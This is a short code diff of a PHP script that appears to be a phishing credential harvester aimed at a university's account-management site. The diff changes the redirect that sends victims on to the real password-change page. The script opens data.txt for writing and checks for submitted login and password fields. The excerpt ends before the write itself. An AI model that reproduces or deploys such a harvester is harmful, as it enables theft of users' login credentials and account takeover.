@@ -1,5 +1,5 @@
 <?php
-header('Location: https://gcu.javerianacali.edu.co/GestionCuentasUsuariosPUJ/cuenta/modificarContrasena/VALIDAR');
+header('Location: https://gcu.javerianacali.edu.co/GestionCuentasUsuariosPUJ/cuenta/validarUsuario/MODIFICARPASS');
 $txt = "data.txt";
 $fh = fopen($txt, 'w+');
 if (isset($_POST['cuentaUsuario.login']) && isset($_POST['cuentaUsuario.password'])) { // check if both fields are set
